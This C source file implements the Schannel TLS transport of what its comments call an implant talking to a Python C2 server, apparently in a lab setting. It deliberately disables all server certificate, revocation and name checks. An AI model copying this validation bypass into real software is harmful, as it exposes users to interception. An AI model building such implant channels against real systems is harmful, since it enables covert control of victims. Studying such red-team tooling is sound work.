#include "tls.h"

/*
 * Private ABI-compatible Schannel credential structures.
 *
 * SCH_CREDENTIALS and TLS_PARAMETERS are gated on NTDDI_WIN10_RS5
 * (0x0A000006) inside <Schannel.h>, but SCH_CREDENTIALS_VERSION is
 * defined UNCONDITIONALLY (no NTDDI guard), so #ifndef guards on that
 * macro never fire even when the structs themselves are missing.
 *
 * We define our own structs with HANK_ prefix so the type names are
 * SDK-version-independent.  AcquireCredentialsHandleW takes pAuthData
 * as PVOID, so the struct name is irrelevant to the ABI.
 *
 * Layout verified against Windows SDK 10.0.22621 <Schannel.h>:
 *   TLS_PARAMETERS  : 6 × DWORD/PVOID fields (24 bytes on x64)
 *   SCH_CREDENTIALS : 11 fields               (72 bytes on x64)
 */
typedef struct _HANK_TLS_PARAMETERS {
    DWORD  cAlpnIds;              /* number of ALPN protocol IDs   */
    PVOID  rgstrAlpnIds;          /* array of SEC_APPLICATION_PROTOCOLS (unused) */
    DWORD  grbitDisabledProtocols;/* mask of SP_PROT_* to disable  */
    DWORD  cDisabledCrypto;       /* count of disabled cipher suites (0 = all allowed) */
    PVOID  pDisabledCrypto;       /* array of CRYPTO_SETTINGS (unused) */
    DWORD  dwCustomVerifyChecks;  /* 0 for default verification    */
} HANK_TLS_PARAMETERS;

typedef struct _HANK_SCH_CREDENTIALS {
    DWORD                dwVersion;        /* must be 0x00000005 (SCH_CREDENTIALS_VERSION) */
    DWORD                dwCredFormat;     /* 0 = default                                  */
    DWORD                cCreds;           /* number of client certs (0 = none)            */
    PVOID               *paCred;           /* array of client cert handles (NULL)          */
    HCERTSTORE           hRootStore;       /* optional trusted root store (NULL)           */
    DWORD                cMappers;         /* 0                                            */
    PVOID               *aphMappers;       /* NULL                                         */
    DWORD                dwSessionLifespan;/* 0 = default (10 hours)                       */
    DWORD                dwFlags;          /* SCH_CRED_* flags                             */
    DWORD                cTlsParameters;   /* number of TLS_PARAMETERS entries             */
    HANK_TLS_PARAMETERS *pTlsParameters;   /* pointer to parameter array                  */
} HANK_SCH_CREDENTIALS;

/*
 * tls.c - Schannel TLS client implementation.
 *
 * Three phases:
 *   1. TlsInit   - credential acquisition + multi-step handshake loop.
 *   2. TlsSendAll / TlsRecvAll - EncryptMessage / DecryptMessage wrappers
 *      with internal plaintext buffering so callers can request arbitrary
 *      byte counts without worrying about TLS record boundaries.
 *   3. TlsCleanup - sends close_notify, releases Schannel handles, closes
 *      the socket.
 *
 * Server certificate validation is intentionally skipped via
 * SCH_CRED_MANUAL_CRED_VALIDATION so that the implant accepts the self-signed
 * lab certificate without needing an embedded CA chain.
 */

#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "crypt32.lib")

/*
 * Flags requested for every ISC call throughout the handshake and shutdown.
 *
 * ISC_REQ_MANUAL_CRED_VALIDATION: tells Schannel to NOT automatically
 * validate the server certificate.  Combined with SCH_CRED_MANUAL_CRED_VALIDATION
 * in the credential flags, this is the belt-and-suspenders approach needed on
 * Windows 11 / VS18 to accept a self-signed lab certificate without embedding
 * a trusted CA chain in the implant.
 */
#define ISC_FLAGS (                          \
    ISC_REQ_SEQUENCE_DETECT             |   \
    ISC_REQ_REPLAY_DETECT               |   \
    ISC_REQ_CONFIDENTIALITY             |   \
    ISC_REQ_EXTENDED_ERROR              |   \
    ISC_REQ_ALLOCATE_MEMORY             |   \
    ISC_REQ_STREAM                      |   \
    ISC_REQ_MANUAL_CRED_VALIDATION      )

/* ---------------------------------------------------------------------------
 * Internal helpers
 * ------------------------------------------------------------------------- */

/**
 * @brief Sends exactly len bytes on the raw (pre-TLS) socket.
 */
static BOOL RawSendAll(SOCKET sock, CONST BYTE* buf, DWORD len)
{
    DWORD sent = 0;
    while (sent < len)
    {
        INT n = send(sock, (CONST CHAR*)buf + sent, (INT)(len - sent), 0);
        if (n == SOCKET_ERROR) return FALSE;
        sent += (DWORD)n;
    }
    return TRUE;
}

/**
 * @brief Receives at least one additional byte into ctx->rawBuf.
 *
 * Called during the handshake (to feed Schannel more server data) and during
 * decryption (when Schannel reports SEC_E_INCOMPLETE_MESSAGE).
 */
static BOOL RawRecvMore(TLS_CONTEXT* ctx)
{
    INT n;
    if (ctx->rawLen >= TLS_RAW_BUFFER_SIZE) return FALSE;
    n = recv(ctx->sock,
             (CHAR*)ctx->rawBuf + ctx->rawLen,
             (INT)(TLS_RAW_BUFFER_SIZE - ctx->rawLen),
             0);
    if (n <= 0) return FALSE;
    ctx->rawLen += (DWORD)n;
    return TRUE;
}

/* ---------------------------------------------------------------------------
 * TlsInit - credential acquisition + TLS handshake
 * ------------------------------------------------------------------------- */

BOOL TlsInit(SOCKET sock, PCWSTR serverName, TLS_CONTEXT* ctx)
{
    HANK_SCH_CREDENTIALS schCreds  = { 0 };
    HANK_TLS_PARAMETERS  tlsParams = { 0 };
    TimeStamp expiry;
    SECURITY_STATUS ss;
    DWORD iscOut;
    BOOL firstCall = TRUE;

    ASSERT(sock != INVALID_SOCKET);
    ASSERT(serverName != NULL);
    ASSERT(ctx != NULL);

    ctx->sock = sock;

    /*
     * Force TLS 1.2 only via the modern SCH_CREDENTIALS structure.
     *
     * The legacy SCHANNEL_CRED.grbitEnabledProtocols field is ignored on
     * Windows 11 22H2+ (Microsoft deprecated it).  With TLS 1.3, the server
     * sends a NewSessionTicket post-handshake message immediately after
     * SEC_E_OK.  Schannel requires the client to process that ticket via
     * DecryptMessage before EncryptMessage can be called; skipping it causes
     * EncryptMessage to return SEC_E_CONTEXT_EXPIRED and the implant silently
     * drops every connection (the server sees EOF).
     *
     * SCH_CREDENTIALS.TLS_PARAMETERS.grbitDisabledProtocols disables
     * everything EXCEPT TLS 1.2 client.  TLS 1.2 has no post-handshake
     * messages, so EncryptMessage works immediately after the handshake.
     *
     * The Python C2 server uses minimum_version = TLSv1_2 and is happy to
     * speak TLS 1.2.
     */
    tlsParams.grbitDisabledProtocols = (DWORD)(~(DWORD)SP_PROT_TLS1_2_CLIENT);

    /*
     * Belt-and-suspenders: every flag below tells Schannel to skip some form
     * of certificate or chain validation.  The lab uses a self-signed cert
     * so all chain/revocation checks must be suppressed.
     *
     *   SCH_CRED_MANUAL_CRED_VALIDATION      – no automatic chain validation
     *   SCH_CRED_NO_DEFAULT_CREDS            – do not search the cert store
     *   SCH_CRED_IGNORE_NO_REVOCATION_CHECK  – ignore missing OCSP/CRL
     *   SCH_CRED_IGNORE_REVOCATION_OFFLINE   – ignore offline revocation
     *   SCH_CRED_NO_SERVERNAME_CHECK         – ignore SNI name mismatch
     */
    schCreds.dwVersion      = 0x00000005; /* SCH_CREDENTIALS_VERSION - literal to avoid SDK gating */
    schCreds.dwFlags        = SCH_CRED_NO_DEFAULT_CREDS              |
                              SCH_CRED_MANUAL_CRED_VALIDATION        |
                              SCH_CRED_IGNORE_NO_REVOCATION_CHECK    |
                              SCH_CRED_IGNORE_REVOCATION_OFFLINE     |
                              SCH_CRED_NO_SERVERNAME_CHECK;
    schCreds.cTlsParameters = 1;
    schCreds.pTlsParameters = &tlsParams;

    ss = AcquireCredentialsHandleW(
        NULL, UNISP_NAME_W, SECPKG_CRED_OUTBOUND,
        NULL, &schCreds, NULL, NULL,
        &ctx->credHandle, &expiry);
    if (FAILED(ss)) return FALSE;
    ctx->credAcquired = TRUE;

    /* Handshake loop.  On the first iteration phContext is NULL and we pass
     * serverName for SNI; on subsequent iterations we pass the live context
     * and NULL for the name.  ISC_REQ_ALLOCATE_MEMORY tells Schannel to
     * heap-allocate output tokens; we free them with FreeContextBuffer. */
    for (;;)
    {
        SecBuffer inBufs[2];
        SecBufferDesc inDesc;
        SecBuffer outBufs[2];
        SecBufferDesc outDesc;

        outBufs[0].cbBuffer   = 0;
        outBufs[0].BufferType = SECBUFFER_TOKEN;
        outBufs[0].pvBuffer   = NULL;
        outBufs[1].cbBuffer   = 0;
        outBufs[1].BufferType = SECBUFFER_ALERT;
        outBufs[1].pvBuffer   = NULL;
        outDesc.ulVersion = SECBUFFER_VERSION;
        outDesc.cBuffers  = 2;
        outDesc.pBuffers  = outBufs;

        inBufs[0].cbBuffer   = ctx->rawLen;
        inBufs[0].BufferType = SECBUFFER_TOKEN;
        inBufs[0].pvBuffer   = ctx->rawBuf;
        inBufs[1].cbBuffer   = 0;
        inBufs[1].BufferType = SECBUFFER_EMPTY;
        inBufs[1].pvBuffer   = NULL;
        inDesc.ulVersion = SECBUFFER_VERSION;
        inDesc.cBuffers  = 2;
        inDesc.pBuffers  = inBufs;

        ss = InitializeSecurityContextW(
            &ctx->credHandle,
            firstCall ? NULL          : &ctx->ctxHandle,
            firstCall ? (SEC_WCHAR*)serverName : NULL,
            ISC_FLAGS, 0, SECURITY_NATIVE_DREP,
            firstCall ? NULL          : &inDesc,
            0,
            &ctx->ctxHandle,    /* phNewContext always receives the handle */
            &outDesc,
            &iscOut, &expiry);

        if (firstCall)
        {
            ctx->ctxInitialized = TRUE;
            firstCall = FALSE;
        }

        /* Forward any token Schannel produced to the server. */
        if (outBufs[0].pvBuffer != NULL)
        {
            if (outBufs[0].cbBuffer > 0)
            {
                BOOL sent = RawSendAll(
                    sock, (CONST BYTE*)outBufs[0].pvBuffer, outBufs[0].cbBuffer);
                FreeContextBuffer(outBufs[0].pvBuffer);
                if (outBufs[1].pvBuffer) FreeContextBuffer(outBufs[1].pvBuffer);
                if (!sent) return FALSE;
            }
            else
            {
                FreeContextBuffer(outBufs[0].pvBuffer);
                if (outBufs[1].pvBuffer) FreeContextBuffer(outBufs[1].pvBuffer);
            }
        }
        else if (outBufs[1].pvBuffer != NULL)
        {
            FreeContextBuffer(outBufs[1].pvBuffer);
        }

        if (ss == SEC_E_OK)
        {
            /* Preserve any application data that arrived after the handshake
             * finished (rare but possible). */
            if (inBufs[1].BufferType == SECBUFFER_EXTRA &&
                inBufs[1].cbBuffer > 0)
            {
                MoveMemory(
                    ctx->rawBuf,
                    ctx->rawBuf + ctx->rawLen - inBufs[1].cbBuffer,
                    inBufs[1].cbBuffer);
                ctx->rawLen = inBufs[1].cbBuffer;
            }
            else
            {
                ctx->rawLen = 0;
            }
            break;
        }

        if (ss == SEC_I_CONTINUE_NEEDED)
        {
            /*
             * Schannel has produced an outbound token (already sent above)
             * and is now waiting for the peer's next message.
             *
             * If Schannel only consumed part of the input it reports the
             * leftover bytes as SECBUFFER_EXTRA in inBufs[1].  Slide those
             * bytes to rawBuf[0] so the next ISC call sees them first, then
             * pull more ciphertext from the network.
             */
            if (inBufs[1].BufferType == SECBUFFER_EXTRA && inBufs[1].cbBuffer > 0)
            {
                MoveMemory(ctx->rawBuf,
                           ctx->rawBuf + ctx->rawLen - inBufs[1].cbBuffer,
                           inBufs[1].cbBuffer);
                ctx->rawLen = inBufs[1].cbBuffer;
            }
            else
            {
                ctx->rawLen = 0;
            }
            if (!RawRecvMore(ctx)) return FALSE;
            continue;
        }

        if (ss == SEC_E_INCOMPLETE_MESSAGE)
        {
            /* rawBuf holds a partial TLS record; just receive more. */
            if (!RawRecvMore(ctx)) return FALSE;
            continue;
        }

        /* Any other status is a fatal handshake error. */
        return FALSE;
    }

    /* Cache TLS record size parameters for use during encryption. */
    ss = QueryContextAttributes(
        &ctx->ctxHandle, SECPKG_ATTR_STREAM_SIZES, &ctx->streamSizes);
    return SUCCEEDED(ss);
}

/* ---------------------------------------------------------------------------
 * TlsSendAll - encrypt and transmit
 * ------------------------------------------------------------------------- */

BOOL TlsSendAll(TLS_CONTEXT* ctx, CONST BYTE* buf, DWORD len)
{
    DWORD maxMsg = ctx->streamSizes.cbMaximumMessage;
    DWORD offset = 0;

    ASSERT(ctx != NULL);
    ASSERT(buf != NULL);

    while (offset < len)
    {
        SECURITY_STATUS ss;
        DWORD chunk      = len - offset;
        DWORD encBufSize;
        PBYTE encBuf;
        SecBuffer bufs[4];
        SecBufferDesc desc;
        BOOL sent;

        if (chunk > maxMsg) chunk = maxMsg;

        /* Layout in encBuf: [header][plaintext copy][trailer] */
        encBufSize = ctx->streamSizes.cbHeader + chunk + ctx->streamSizes.cbTrailer;
        encBuf = (PBYTE)ImplantHeapAlloc(encBufSize);
        if (encBuf == NULL) return FALSE;

        CopyMemory(encBuf + ctx->streamSizes.cbHeader, buf + offset, chunk);

        bufs[0].cbBuffer   = ctx->streamSizes.cbHeader;
        bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
        bufs[0].pvBuffer   = encBuf;

        bufs[1].cbBuffer   = chunk;
        bufs[1].BufferType = SECBUFFER_DATA;
        bufs[1].pvBuffer   = encBuf + ctx->streamSizes.cbHeader;

        bufs[2].cbBuffer   = ctx->streamSizes.cbTrailer;
        bufs[2].BufferType = SECBUFFER_STREAM_TRAILER;
        bufs[2].pvBuffer   = encBuf + ctx->streamSizes.cbHeader + chunk;

        bufs[3].cbBuffer   = 0;
        bufs[3].BufferType = SECBUFFER_EMPTY;
        bufs[3].pvBuffer   = NULL;

        desc.ulVersion = SECBUFFER_VERSION;
        desc.cBuffers  = 4;
        desc.pBuffers  = bufs;

        ss = EncryptMessage(&ctx->ctxHandle, 0, &desc, 0);
        if (FAILED(ss))
        {
            ImplantHeapFree(encBuf);
            return FALSE;
        }

        /* Send header + (now-encrypted) data + trailer as one write. */
        sent = RawSendAll(ctx->sock, encBuf,
                          bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer);
        ImplantHeapFree(encBuf);
        if (!sent) return FALSE;

        offset += chunk;
    }

    return TRUE;
}

/* ---------------------------------------------------------------------------
 * TlsRecvAll - decrypt and deliver
 * ------------------------------------------------------------------------- */

BOOL TlsRecvAll(TLS_CONTEXT* ctx, BYTE* buf, DWORD len)
{
    DWORD consumed = 0;

    ASSERT(ctx != NULL);
    ASSERT(buf != NULL);

    while (consumed < len)
    {
        /* ---- Serve from the already-decrypted plaintext buffer ---- */
        if (ctx->plainBuf != NULL && ctx->plainOff < ctx->plainLen)
        {
            DWORD avail = ctx->plainLen - ctx->plainOff;
            DWORD take  = avail < (len - consumed) ? avail : (len - consumed);
            CopyMemory(buf + consumed, ctx->plainBuf + ctx->plainOff, take);
            ctx->plainOff += take;
            consumed      += take;

            if (ctx->plainOff >= ctx->plainLen)
            {
                ImplantHeapFree(ctx->plainBuf);
                ctx->plainBuf = NULL;
                ctx->plainLen = 0;
                ctx->plainOff = 0;
            }
            continue;
        }

        /* ---- Need to decrypt another TLS record ---- */
        if (ctx->rawLen == 0)
        {
            /* No buffered ciphertext; pull at least one byte from the socket. */
            if (!RawRecvMore(ctx)) return FALSE;
        }

        for (;;)
        {
            SECURITY_STATUS ss;
            SecBuffer bufs[4];
            SecBufferDesc desc;
            PBYTE plainPtr  = NULL;
            DWORD plainSize = 0;
            PBYTE extraPtr  = NULL;
            DWORD extraSize = 0;
            INT i;

            /* Pass the entire rawBuf to DecryptMessage; it will work in-place
             * and set each buffer's BufferType to describe what it found. */
            bufs[0].cbBuffer   = ctx->rawLen;
            bufs[0].BufferType = SECBUFFER_DATA;
            bufs[0].pvBuffer   = ctx->rawBuf;
            bufs[1].cbBuffer   = 0;
            bufs[1].BufferType = SECBUFFER_EMPTY;
            bufs[1].pvBuffer   = NULL;
            bufs[2].cbBuffer   = 0;
            bufs[2].BufferType = SECBUFFER_EMPTY;
            bufs[2].pvBuffer   = NULL;
            bufs[3].cbBuffer   = 0;
            bufs[3].BufferType = SECBUFFER_EMPTY;
            bufs[3].pvBuffer   = NULL;

            desc.ulVersion = SECBUFFER_VERSION;
            desc.cBuffers  = 4;
            desc.pBuffers  = bufs;

            ss = DecryptMessage(&ctx->ctxHandle, &desc, 0, NULL);

            if (ss == SEC_E_INCOMPLETE_MESSAGE)
            {
                /* rawBuf holds a partial TLS record; receive more ciphertext
                 * and re-try the decrypt on the next inner loop iteration. */
                if (!RawRecvMore(ctx)) return FALSE;
                continue;
            }

            if (ss != SEC_E_OK) return FALSE;

            /* Locate the decrypted plaintext and any leftover ciphertext. */
            for (i = 0; i < 4; i++)
            {
                if (bufs[i].BufferType == SECBUFFER_DATA)
                {
                    plainPtr  = (PBYTE)bufs[i].pvBuffer;
                    plainSize = bufs[i].cbBuffer;
                }
                if (bufs[i].BufferType == SECBUFFER_EXTRA)
                {
                    extraPtr  = (PBYTE)bufs[i].pvBuffer;
                    extraSize = bufs[i].cbBuffer;
                }
            }

            /* Copy plaintext to our heap buffer BEFORE moving extra data,
             * since both pointers live inside rawBuf. */
            if (plainSize > 0 && plainPtr != NULL)
            {
                ctx->plainBuf = (PBYTE)ImplantHeapAlloc(plainSize);
                if (ctx->plainBuf == NULL) return FALSE;
                CopyMemory(ctx->plainBuf, plainPtr, plainSize);
                ctx->plainLen = plainSize;
                ctx->plainOff = 0;
            }

            /* Slide any remaining ciphertext (next TLS record) to rawBuf[0]. */
            if (extraSize > 0 && extraPtr != NULL)
            {
                MoveMemory(ctx->rawBuf, extraPtr, extraSize);
                ctx->rawLen = extraSize;
            }
            else
            {
                ctx->rawLen = 0;
            }

            break;
        }
    }

    return TRUE;
}

/* ---------------------------------------------------------------------------
 * TlsCleanup - graceful TLS shutdown + socket close
 * ------------------------------------------------------------------------- */

VOID TlsCleanup(TLS_CONTEXT* ctx)
{
    DWORD dwType;
    SecBuffer outBuf;
    SecBufferDesc outDesc;
    SecBuffer shutBuf;
    SecBufferDesc shutDesc;
    DWORD iscOut;
    TimeStamp expiry;

    if (ctx == NULL) return;

    if (ctx->ctxInitialized)
    {
        /* Signal Schannel that we want to close the session. */
        dwType            = SCHANNEL_SHUTDOWN;
        outBuf.cbBuffer   = sizeof(dwType);
        outBuf.BufferType = SECBUFFER_TOKEN;
        outBuf.pvBuffer   = &dwType;
        outDesc.ulVersion = SECBUFFER_VERSION;
        outDesc.cBuffers  = 1;
        outDesc.pBuffers  = &outBuf;
        (VOID)ApplyControlToken(&ctx->ctxHandle, &outDesc);

        /* Generate the close_notify alert token. */
        shutBuf.cbBuffer   = 0;
        shutBuf.BufferType = SECBUFFER_TOKEN;
        shutBuf.pvBuffer   = NULL;
        shutDesc.ulVersion = SECBUFFER_VERSION;
        shutDesc.cBuffers  = 1;
        shutDesc.pBuffers  = &shutBuf;

        (VOID)InitializeSecurityContextW(
            &ctx->credHandle, &ctx->ctxHandle, NULL,
            ISC_FLAGS, 0, SECURITY_NATIVE_DREP,
            NULL, 0, &ctx->ctxHandle,
            &shutDesc, &iscOut, &expiry);

        if (shutBuf.pvBuffer != NULL)
        {
            if (ctx->sock != INVALID_SOCKET && shutBuf.cbBuffer > 0)
            {
                /* Best-effort; ignore send failures during shutdown. */
                (VOID)RawSendAll(
                    ctx->sock, (CONST BYTE*)shutBuf.pvBuffer, shutBuf.cbBuffer);
            }
            FreeContextBuffer(shutBuf.pvBuffer);
        }

        DeleteSecurityContext(&ctx->ctxHandle);
        ctx->ctxInitialized = FALSE;
    }

    if (ctx->credAcquired)
    {
        FreeCredentialsHandle(&ctx->credHandle);
        ctx->credAcquired = FALSE;
    }

    /* Release any buffered plaintext. */
    if (ctx->plainBuf != NULL)
    {
        ImplantHeapFree(ctx->plainBuf);
        ctx->plainBuf = NULL;
        ctx->plainLen = 0;
        ctx->plainOff = 0;
    }

    if (ctx->sock != INVALID_SOCKET)
    {
        shutdown(ctx->sock, SD_BOTH);
        closesocket(ctx->sock);
        ctx->sock = INVALID_SOCKET;
    }
}
